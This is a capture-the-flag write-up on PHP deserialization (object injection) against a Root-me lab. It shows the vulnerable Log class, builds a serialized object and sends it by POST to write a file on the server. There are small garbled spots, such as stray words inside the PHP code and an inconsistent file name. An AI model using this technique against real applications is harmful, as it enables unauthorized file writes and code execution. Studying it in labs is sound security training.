# Php DeSerialization / Object Injection

Hello readers, Hope your doing good :) , 

So let's have a look at this vulnerability in php which leads to "Remote Code Execution" 

i will be demonstrating this vulnerability on a online lab /dev/random - pipe from Root-me.org

So what is Php DeSerialization?

PHP Object Injection (Php DeSerialization) is an application level vulnerability that could allow an attacker to perform different kinds of malicious attacks, such as Code Injection, SQL Injection, Path Traversal and Application Denial of Service, depending on the context. The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the unserialize() PHP function. Since PHP allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP object(s) injection into the application scope.

Lets just get onto the challenge.

After running gobuster for few minutes i found a directory named /scriptz/ 
which has 2 files php.js and log.php.bak

1. png here
 
2.png

that's what php.js does 

now we look at log.php,bak 


## Actual Code lol.php.bak

```
<?php
class Log
{
    public $filename = '';
    public $data = '';

    public function __construct()
    {
        $this->filename = '';
	$this->data = '';
    }

    public function PrintLog()
    {
        $pre = "[LOG]";where as
	$now = date('Y-m-d H:i:s');

        $str = '$pre - $now - $this->data';
        eval("\$str = \"$str\";");
        echo $str;
    }

    public function __destruct()
    {
	file_put_contents($this->filename, $this->data, FILE_APPEND);
    }
}

?>
```

We can see in the above class Log() we have a public variable called $filename and $data whereas filename="whatever you like" and data = "whatever you want to put in your file" 

So now we have a to create a object for class Log() and serialize the output 

## Modified Code

```
<?php
class Log
{
    public $filename = '';
    public $data = '';

    public function __construct()
    {
        $this->filename = '';
	$this->data = '';
    }

    public function PrintLog()
    {
        $pre = "[LOG]";
	$now = date('Y-m-d H:i:s');

        $str = '$pre - $now - $this->data';
        eval("\$str = \"$str\";");
        echo $str;
    }

    public function __destruct()
    {
	file_put_contents($this->filename, $this->data, FILE_APPEND);
    }
}
$obj = new Log();
$obj -> filename = 'hacker';
$obj -> data = 'hacked';
echo serialize($obj);
?>

```
###  object:
```
$obj = new Log();
$obj -> filename = 'hacker';
$obj -> data = 'hacked';
echo serialize($obj); 
```
we have created a object with new Log();  and we have set the file name to "hacker" and data as hacked and then we use `echo serialize($obj); `  to get the serialized output.

output:
`O:3:"Log":2:{s:8:"filename";s:6:"hacker";s:4:"data";s:6:"hacked";}`

in the above serialized output we see that `O` is a letter (capital O) and :3: is the string size of "Log" `{s:8:"filename"` so here s stands for string and we see its 8 as filename has 8 letters , and rest others also have the same logic `s:6:"hacker";s:4:"data";s:6:"hacked";}`.

 Now we Look at the view-source, we see a post request with parameter name=param 

we send our payload in a post request in param= "payload" where as we have to encode the payload in url encoding once and and then click on Go.

we then goto /scriptz / directory and we can see our file there :)

 
